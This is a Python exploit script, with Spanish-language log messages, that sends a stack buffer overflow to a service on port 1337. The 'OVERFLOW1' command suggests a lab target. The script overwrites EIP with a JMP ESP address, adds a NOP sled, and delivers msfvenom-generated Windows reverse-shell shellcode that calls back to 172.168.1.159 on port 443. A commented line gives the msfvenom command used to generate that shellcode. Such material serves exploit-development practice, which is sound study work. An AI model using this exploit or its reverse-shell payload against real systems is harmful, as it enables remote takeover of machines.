#!/usr/bin/env python3

import socket
import sys
import six
import time
from pwn import *

def conexion():
	offset 	= 1978
	buffe  	= "A" * offset
	eip	   	= "\xaf\x11\x50\x62"  #  625011AF   FFE4             JMP ESP
	nops	= "\x90" * 16
	#badchars = \x00\x07\x2e\xa0
	#msfvenom -p windows/shell_reverse_tcp LHOST=172.168.1.159 LPORT=443 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
	payload = ("\xd9\xea\xb8\x9d\xb1\x12\x08\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x13\x03\xde\xa2\xf0\xfd\x1c\x2c\x76"
"\xfd\xdc\xad\x17\x77\x39\x9c\x17\xe3\x4a\x8f\xa7\x67\x1e\x3c"
"\x43\x25\x8a\xb7\x21\xe2\xbd\x70\x8f\xd4\xf0\x81\xbc\x25\x93"
"\x01\xbf\x79\x73\x3b\x70\x8c\x72\x7c\x6d\x7d\x26\xd5\xf9\xd0"
"\xd6\x52\xb7\xe8\x5d\x28\x59\x69\x82\xf9\x58\x58\x15\x71\x03"
"\x7a\x94\x56\x3f\x33\x8e\xbb\x7a\x8d\x25\x0f\xf0\x0c\xef\x41"
"\xf9\xa3\xce\x6d\x08\xbd\x17\x49\xf3\xc8\x61\xa9\x8e\xca\xb6"
"\xd3\x54\x5e\x2c\x73\x1e\xf8\x88\x85\xf3\x9f\x5b\x89\xb8\xd4"
"\x03\x8e\x3f\x38\x38\xaa\xb4\xbf\xee\x3a\x8e\x9b\x2a\x66\x54"
"\x85\x6b\xc2\x3b\xba\x6b\xad\xe4\x1e\xe0\x40\xf0\x12\xab\x0c"
"\x35\x1f\x53\xcd\x51\x28\x20\xff\xfe\x82\xae\xb3\x77\x0d\x29"
"\xb3\xad\xe9\xa5\x4a\x4e\x0a\xec\x88\x1a\x5a\x86\x39\x23\x31"
"\x56\xc5\xf6\x96\x06\x69\xa9\x56\xf6\xc9\x19\x3f\x1c\xc6\x46"
"\x5f\x1f\x0c\xef\xca\xda\xc7\xbc\xa3\xe5\x88\xd5\xb1\xe5\xb7"
"\x9e\x3f\x03\xdd\xf0\x69\x9c\x4a\x68\x30\x56\xea\x75\xee\x13"
"\x2c\xfd\x1d\xe4\xe3\xf6\x68\xf6\x94\xf6\x26\xa4\x33\x08\x9d"
"\xc0\xd8\x9b\x7a\x10\x96\x87\xd4\x47\xff\x76\x2d\x0d\xed\x21"
"\x87\x33\xec\xb4\xe0\xf7\x2b\x05\xee\xf6\xbe\x31\xd4\xe8\x06"
"\xb9\x50\x5c\xd7\xec\x0e\x0a\x91\x46\xe1\xe4\x4b\x34\xab\x60"
"\x0d\x76\x6c\xf6\x12\x53\x1a\x16\xa2\x0a\x5b\x29\x0b\xdb\x6b"
"\x52\x71\x7b\x93\x89\x31\x9b\x76\x1b\x4c\x34\x2f\xce\xed\x59"
"\xd0\x25\x31\x64\x53\xcf\xca\x93\x4b\xba\xcf\xd8\xcb\x57\xa2"
"\x71\xbe\x57\x11\x71\xeb")
	
	try:
		p1.status("Iniciando conexion")
		time.sleep(1)
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		conn = sock.connect((Target,Port))
		sock.settimeout(timeout)

		p1.status("Conexion Establecida")
		time.sleep(1)
		sock.recv(1024).decode('utf-8')
	
		Overflow = "OVERFLOW1 "+ buffe + eip + nops + payload

		p1.status("Enviando Informacion")
		sock.send(six.b(Overflow))

		sock.close()
		p1.status("Conexion Terminada")

	except Exception as error:
		log.failure(str(error))
		sys.exit(1)

if __name__ == '__main__':
	global p1
	global Target
	global Port

	Target = '172.168.1.176'
	Port   = 1337
	timeout = 5

	try:
		p1 = log.progress("OverFlow")
		conexion()
		p1.success("Proceso terminado")

	except Exception as error:
		log.failure(str(error))
		sys.exit(1)

	except KeyboardInterrupt:
		log.failure("Salida Forzada ....")
		sys.exit(0)
